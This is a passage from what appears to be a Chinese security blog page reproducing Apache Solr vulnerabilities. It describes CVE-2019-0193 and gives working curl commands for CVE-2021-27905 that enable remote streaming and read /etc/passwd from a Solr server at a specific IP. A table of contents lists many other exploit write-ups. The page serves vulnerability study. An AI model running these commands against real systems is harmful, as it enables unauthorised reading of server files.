<h5 id="CVE-2019-0193-远程命令执行漏洞"><a href="#CVE-2019-0193-远程命令执行漏洞" class="headerlink" title="CVE-2019-0193 (远程命令执行漏洞)"></a>CVE-2019-0193 (远程命令执行漏洞)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Solr 是一个开源的搜索服务器。Solr 使用 Java 语言开发，主要基于 HTTP 和 Apache Lucene 实现。此次漏洞出现在Apache Solr的DataImportHandler，该模块是一个可选但常用的模块，用于从数据库和其他源中提取数据。它具有一个功能，其中所有的DIH配置都可以通过外部请求的dataConfig参数来设置。由于DIH配置可以包含脚本，因此攻击者可以通过构造危险的请求，从而造成远程命令执行。</span><br></pre></td></tr></table></figure>

<p><img src="/2023/08/03/%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2/image-20230802211400998.png" alt="image-20230802211400998"></p>
<h5 id="CVE-2021-27905-文件读取"><a href="#CVE-2021-27905-文件读取" class="headerlink" title="CVE-2021-27905 (文件读取)"></a>CVE-2021-27905 (文件读取)</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">全版本官方拒绝修复漏洞</span><br><span class="line">1、获取数据库名</span><br><span class="line">http://47.94.236.117:8983/solr/admin/cores?indexInfo=false&amp;wt=json</span><br><span class="line">2、访问触发</span><br><span class="line">curl -i -s -k -X $&#x27;POST&#x27; \</span><br><span class="line">    -H $&#x27;Content-Type: application/json&#x27; --data-binary $&#x27;&#123;\&quot;set-property\&quot;:&#123;\&quot;requestDispatcher.requestParsers.enableRemoteStreaming\&quot;:true&#125;&#125;&#x27; \</span><br><span class="line">    $&#x27;http://47.94.236.117:8983/solr/demo/config&#x27;</span><br><span class="line">3、任意文件读取</span><br><span class="line">curl -i -s -k &#x27;http://47.94.236.117:8983/solr/demo/debug/dump?param=ContentStreams&amp;stream.url=file:///etc/passwd&#x27;</span><br><span class="line"></span><br></pre></td></tr></table></figure>








            <!--[if lt IE 9]><script>document.createElement('audio');</script><![endif]-->
            <audio id="audio" loop="1" preload="auto" controls="controls" data-autoplay="false">
                <source type="audio/mpeg" src="">
            </audio>
            
                <ul id="audio-list" style="display:none">
                    
                        
                            <li title="0" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
                        
                    
                        
                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
                        
                    
                </ul>
            
        </div>
        
        
    <div id="gitalk-container" class="comment link"
		data-enable="false"
        data-ae="false"
        data-ci=""
        data-cs=""
        data-r=""
        data-o=""
        data-a=""
        data-d="false"
    >查看评论</div>


    </div>
    
        <div class="side">
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E6%94%BB%E9%98%B2"><span class="toc-number">1.</span> <span class="toc-text">服务攻防</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%BA%93%E5%AE%89%E5%85%A8"><span class="toc-number">1.1.</span> <span class="toc-text">数据库安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Redis-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-RCE"><span class="toc-number">1.1.1.</span> <span class="toc-text">Redis-未授权访问-RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-number">1.1.1.0.1.</span> <span class="toc-text">一、漏洞简介</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.1.1.0.2.</span> <span class="toc-text">二、漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Mysql"><span class="toc-number">1.1.2.</span> <span class="toc-text">Mysql</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Mysql%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-CVE-2012-2122"><span class="toc-number">1.1.2.1.</span> <span class="toc-text">Mysql身份认证漏洞复现(CVE-2012-2122)</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-1"><span class="toc-number">1.1.2.1.1.</span> <span class="toc-text">一、漏洞简介</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%BD%B1%E5%93%8D"><span class="toc-number">1.1.2.1.2.</span> <span class="toc-text">二、漏洞影响</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.1.2.1.3.</span> <span class="toc-text">三、漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Hadoop"><span class="toc-number">1.1.3.</span> <span class="toc-text">Hadoop</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-2"><span class="toc-number">1.1.3.0.1.</span> <span class="toc-text">一、漏洞简介</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">1.1.3.0.2.</span> <span class="toc-text">二、环境搭建</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">1.1.3.0.3.</span> <span class="toc-text">三、漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Influxdb-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-JWT%E9%AA%8C%E8%AF%81%E4%B8%8D%E5%BD%93"><span class="toc-number">1.1.4.</span> <span class="toc-text">Influxdb-未授权访问-JWT验证不当</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-3"><span class="toc-number">1.1.4.0.1.</span> <span class="toc-text">一、漏洞简介</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-number">1.1.4.0.2.</span> <span class="toc-text">二、漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#H2database-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE-%E9%85%8D%E7%BD%AE%E4%B8%8D%E5%BD%93"><span class="toc-number">1.1.5.</span> <span class="toc-text">H2database-未授权访问-配置不当</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-4"><span class="toc-number">1.1.5.0.1.</span> <span class="toc-text">一、漏洞简介</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="toc-number">1.1.5.0.2.</span> <span class="toc-text">二、漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#CouchDB-%E6%9D%83%E9%99%90%E7%BB%95%E8%BF%87-%E9%85%8D%E5%90%88-RCE-%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.6.</span> <span class="toc-text">CouchDB-权限绕过 配合 RCE-漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-5"><span class="toc-number">1.1.6.0.1.</span> <span class="toc-text">一、漏洞简介</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="toc-number">1.1.6.0.2.</span> <span class="toc-text">二、漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ElasticSearh-%E6%96%87%E4%BB%B6%E5%86%99%E5%85%A5-RCE-%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.1.7.</span> <span class="toc-text">ElasticSearh-文件写入&amp; RCE-漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-6"><span class="toc-number">1.1.7.0.1.</span> <span class="toc-text">一、漏洞简介</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-4"><span class="toc-number">1.1.7.0.2.</span> <span class="toc-text">二、漏洞复现</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE"><span class="toc-number">1.2.</span> <span class="toc-text">应用协议</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP-RDP-SSH-%E5%8F%A3%E4%BB%A4%E7%8C%9C%E8%A7%A3"><span class="toc-number">1.2.1.</span> <span class="toc-text">FTP&amp;RDP&amp;SSH-口令猜解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Rsync-%E6%96%87%E4%BB%B6%E5%A4%87%E4%BB%BD"><span class="toc-number">1.2.2.</span> <span class="toc-text">Rsync 文件备份</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-7"><span class="toc-number">1.2.2.0.1.</span> <span class="toc-text">一、漏洞简介</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-5"><span class="toc-number">1.2.2.0.2.</span> <span class="toc-text">二、漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FTP-Proftpd-%E6%90%AD%E5%BB%BA-%E5%BA%94%E7%94%A8%E8%BD%AF%E4%BB%B6"><span class="toc-number">1.2.3.</span> <span class="toc-text">FTP&amp;Proftpd 搭建-应用软件</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0"><span class="toc-number">1.2.3.0.1.</span> <span class="toc-text">一、漏洞描述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-6"><span class="toc-number">1.2.3.0.2.</span> <span class="toc-text">二、漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#libbsh-%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87"><span class="toc-number">1.2.4.</span> <span class="toc-text">libbsh 身份认证绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-8"><span class="toc-number">1.2.4.0.1.</span> <span class="toc-text">一、漏洞简介</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-7"><span class="toc-number">1.2.4.0.2.</span> <span class="toc-text">二、漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%91%E6%97%A5%E8%91%B5-VNC-Teamviewer"><span class="toc-number">1.2.5.</span> <span class="toc-text">向日葵&amp;VNC&amp;Teamviewer</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E5%90%91%E6%97%A5%E8%91%B5RCE"><span class="toc-number">1.2.5.0.1.</span> <span class="toc-text">一、向日葵RCE</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81VNC-%E7%A9%BA%E5%8F%A3%E4%BB%A4-%E5%AF%86%E7%A0%81%E7%88%86%E7%A0%B4"><span class="toc-number">1.2.5.0.2.</span> <span class="toc-text">二、VNC&amp;空口令-密码爆破</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%89%E3%80%81Teamviewer"><span class="toc-number">1.2.5.0.3.</span> <span class="toc-text">三、Teamviewer</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Zabbix-CVE-2022-23131"><span class="toc-number">1.2.6.</span> <span class="toc-text">Zabbix-CVE-2022-23131</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-1"><span class="toc-number">1.2.6.0.1.</span> <span class="toc-text">一、漏洞描述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-%E6%9C%AA%E6%8E%88%E6%9D%83%E7%99%BB%E5%BD%95%E9%85%8D%E5%90%88RCE"><span class="toc-number">1.2.6.0.2.</span> <span class="toc-text">二、漏洞复现-未授权登录配合RCE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#kibana-CVE-2019-7609"><span class="toc-number">1.2.7.</span> <span class="toc-text">kibana-CVE-2019-7609</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.2.7.0.1.</span> <span class="toc-text">一、漏洞介绍</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-8"><span class="toc-number">1.2.7.0.2.</span> <span class="toc-text">二、漏洞复现</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%AD%E9%97%B4%E4%BB%B6%E5%AE%89%E5%85%A8"><span class="toc-number">1.3.</span> <span class="toc-text">中间件安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IIS-%E7%9F%AD%E6%96%87%E4%BB%B6-%E8%A7%A3%E6%9E%90-%E8%93%9D%E5%B1%8F"><span class="toc-number">1.3.1.</span> <span class="toc-text">IIS-短文件&amp;解析&amp;蓝屏</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-2"><span class="toc-number">1.3.1.0.1.</span> <span class="toc-text">一、漏洞描述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-9"><span class="toc-number">1.3.1.0.2.</span> <span class="toc-text">二、漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Nginx-%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%AD%89"><span class="toc-number">1.3.2.</span> <span class="toc-text">Nginx-文件解析&amp;命令执行等</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-3"><span class="toc-number">1.3.2.0.1.</span> <span class="toc-text">一、漏洞描述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-10"><span class="toc-number">1.3.2.0.2.</span> <span class="toc-text">二、漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-RCE-%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86-%E6%96%87%E4%BB%B6%E8%A7%A3%E6%9E%90"><span class="toc-number">1.3.3.</span> <span class="toc-text">Apache-RCE&amp;目录遍历&amp;文件解析</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-4"><span class="toc-number">1.3.3.0.1.</span> <span class="toc-text">一、漏洞描述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-11"><span class="toc-number">1.3.3.0.2.</span> <span class="toc-text">二、漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Tomcat-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%AD%89"><span class="toc-number">1.3.4.</span> <span class="toc-text">Tomcat-弱口令&amp;文件上传&amp;文件包含等</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E6%8F%8F%E8%BF%B0-5"><span class="toc-number">1.3.4.0.1.</span> <span class="toc-text">一、漏洞描述</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-12"><span class="toc-number">1.3.4.0.2.</span> <span class="toc-text">二、漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Weblogic"><span class="toc-number">1.3.5.</span> <span class="toc-text">Weblogic</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2017-3506"><span class="toc-number">1.3.5.0.1.</span> <span class="toc-text">CVE-2017-3506</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#cve-2018-2893"><span class="toc-number">1.3.5.0.2.</span> <span class="toc-text">cve_2018_2893</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#cve-2020-14882"><span class="toc-number">1.3.5.0.3.</span> <span class="toc-text">cve_2020_14882</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#cve-2023-21839"><span class="toc-number">1.3.5.0.4.</span> <span class="toc-text">cve_2023-21839</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JBoss"><span class="toc-number">1.3.6.</span> <span class="toc-text">JBoss</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2017-12149"><span class="toc-number">1.3.6.0.1.</span> <span class="toc-text">CVE-2017-12149</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Jenkins"><span class="toc-number">1.3.7.</span> <span class="toc-text">Jenkins</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2017-1000353"><span class="toc-number">1.3.7.0.1.</span> <span class="toc-text">CVE-2017-1000353</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2018-1000861"><span class="toc-number">1.3.7.0.2.</span> <span class="toc-text">CVE-2018-1000861</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GlassFish"><span class="toc-number">1.3.8.</span> <span class="toc-text">GlassFish</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2017-1000028"><span class="toc-number">1.3.8.0.1.</span> <span class="toc-text">CVE-2017-1000028</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Docker"><span class="toc-number">1.3.9.</span> <span class="toc-text">Docker</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Dokcer-%E6%9C%AA%E6%8E%88%E6%9D%83%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.3.9.0.1.</span> <span class="toc-text">Dokcer 未授权漏洞复现</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#WebSphere"><span class="toc-number">1.3.10.</span> <span class="toc-text">WebSphere</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2015-7450-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.3.10.0.1.</span> <span class="toc-text">CVE-2015-7450 反序列化</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%90%8E%E5%8F%B0%E5%BC%B1%E5%8F%A3%E4%BB%A4Getshell"><span class="toc-number">1.3.10.0.2.</span> <span class="toc-text">后台弱口令Getshell</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jetty"><span class="toc-number">1.3.11.</span> <span class="toc-text">jetty</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2021-28164"><span class="toc-number">1.3.11.0.1.</span> <span class="toc-text">CVE-2021-28164</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2021-28169"><span class="toc-number">1.3.11.0.2.</span> <span class="toc-text">CVE-2021-28169</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2021-34429"><span class="toc-number">1.3.11.0.3.</span> <span class="toc-text">CVE-2021-34429</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8"><span class="toc-number">1.4.</span> <span class="toc-text">框架安全</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Spring"><span class="toc-number">1.4.1.</span> <span class="toc-text">Spring</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#cve-2017-4971-Spring-Web-Flow"><span class="toc-number">1.4.1.0.1.</span> <span class="toc-text">cve_2017_4971-Spring Web Flow</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2022-22963-Spring-Cloud-Function-Spel"><span class="toc-number">1.4.1.0.2.</span> <span class="toc-text">CVE-2022-22963 Spring Cloud Function Spel</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#cve-2018-1273-Spring-Data-Commons"><span class="toc-number">1.4.1.0.3.</span> <span class="toc-text">cve_2018_1273-Spring Data Commons</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Struts2"><span class="toc-number">1.4.2.</span> <span class="toc-text">Struts2</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#cve-2020-17530"><span class="toc-number">1.4.2.0.1.</span> <span class="toc-text">cve_2020_17530</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Laravel"><span class="toc-number">1.4.3.</span> <span class="toc-text">Laravel</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2021-3129-RCE"><span class="toc-number">1.4.3.0.1.</span> <span class="toc-text">CVE-2021-3129 RCE</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ThinkPHP"><span class="toc-number">1.4.4.</span> <span class="toc-text">ThinkPHP</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JQuery"><span class="toc-number">1.4.5.</span> <span class="toc-text">JQuery</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#jQuery-Upload-File"><span class="toc-number">1.4.5.0.1.</span> <span class="toc-text">jQuery Upload File &lt;&#x3D; 4.0.2 中的任意文件上传</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Node-js"><span class="toc-number">1.4.6.</span> <span class="toc-text">Node.js</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#cve-2017-14849"><span class="toc-number">1.4.6.0.1.</span> <span class="toc-text">cve_2017_14849</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Django"><span class="toc-number">1.4.7.</span> <span class="toc-text">Django</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#cve-2019-14234"><span class="toc-number">1.4.7.0.1.</span> <span class="toc-text">cve_2019_14234</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2021-35042"><span class="toc-number">1.4.7.0.2.</span> <span class="toc-text">CVE-2021-35042</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Flask"><span class="toc-number">1.4.8.</span> <span class="toc-text">Flask</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-Shiro"><span class="toc-number">1.4.9.</span> <span class="toc-text">Apache Shiro</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2016-4437"><span class="toc-number">1.4.9.0.1.</span> <span class="toc-text">CVE_2016_4437</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2020-11989"><span class="toc-number">1.4.9.0.2.</span> <span class="toc-text">CVE-2020-11989</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2020-1957"><span class="toc-number">1.4.9.0.3.</span> <span class="toc-text">CVE-2020-1957</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Apache-Solor"><span class="toc-number">1.4.10.</span> <span class="toc-text">Apache Solor</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2017-12629-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CRCE"><span class="toc-number">1.4.10.0.1.</span> <span class="toc-text">CVE-2017-12629 (远程命令执行RCE)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2019-17558%EF%BC%88%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96AND%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%89"><span class="toc-number">1.4.10.0.2.</span> <span class="toc-text">CVE-2019-17558（任意文件读取AND命令执行）</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2019-0193-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.4.10.0.3.</span> <span class="toc-text">CVE-2019-0193 (远程命令执行漏洞)</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#CVE-2021-27905-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-number">1.4.10.0.4.</span> <span class="toc-text">CVE-2021-27905 (文件读取)</span></a></li></ol></li></ol></li></ol></li></ol></li></ol>
        </div>
    
</div>


    </div>
</div>
</body>


<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
<script src="/js/plugin.js"></script>
<script src="/js/typed.js"></script>
<script src="/js/diaspora.js"></script>


<link rel="stylesheet" href="/photoswipe/photoswipe.css">
<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">


<script src="/photoswipe/photoswipe.min.js"></script>
<script src="/photoswipe/photoswipe-ui-default.min.js"></script>


<!-- Root element of PhotoSwipe. Must have class pswp. -->
<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
    <!-- Background of PhotoSwipe. 
         It's a separate element as animating opacity is faster than rgba(). -->
    <div class="pswp__bg"></div>
    <!-- Slides wrapper with overflow:hidden. -->
    <div class="pswp__scroll-wrap">
        <!-- Container that holds slides. 
            PhotoSwipe keeps only 3 of them in the DOM to save memory.
            Don't modify these 3 pswp__item elements, data is added later on. -->
        <div class="pswp__container">
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
            <div class="pswp__item"></div>
        </div>
        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
        <div class="pswp__ui pswp__ui--hidden">
            <div class="pswp__top-bar">
                <!--  Controls are self-explanatory. Order can be changed. -->
                <div class="pswp__counter"></div>
                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
                <button class="pswp__button pswp__button--share" title="Share"></button>
                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
                <!-- element will get class pswp__preloader--active when preloader is running -->
                <div class="pswp__preloader">
                    <div class="pswp__preloader__icn">
                      <div class="pswp__preloader__cut">
